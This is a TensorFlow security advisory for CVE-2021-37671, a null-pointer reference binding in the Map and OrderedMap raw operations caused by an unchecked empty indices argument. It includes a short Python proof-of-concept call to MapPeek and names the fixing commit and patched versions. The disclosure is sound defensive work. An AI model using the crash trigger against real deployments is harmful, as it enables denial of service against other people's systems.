<h2>TFSA-2021-145: Reference binding to nullptr in map operations</h2>
<h3>CVE Number</h3>
<p>CVE-2021-37671</p>
<h3>Impact</h3>
<p>An attacker can cause undefined behavior via binding a reference to null pointer
in <code>tf.raw_ops.Map*</code> and <code>tf.raw_ops.OrderedMap*</code> operations:</p>
<p>```python
import tensorflow as tf</p>
<p>tf.raw_ops.MapPeek(
  key=tf.constant([8],dtype=tf.int64),
  indices=[],
  dtypes=[tf.int32],
  capacity=8,
  memory_limit=128)
```</p>

has a check in place to ensure that <code>indices</code> is in ascending order, but does
not check that <code>indices</code> is not empty.</p>
<h3>Patches</h3>
<p>We have patched the issue in GitHub commit
<a href="https://github.com/tensorflow/tensorflow/commit/532f5c5a547126c634fefd43bbad1dc6417678ac">532f5c5a547126c634fefd43bbad1dc6417678ac</a>.</p>
<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this
commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are
also affected and still in supported range.</p>
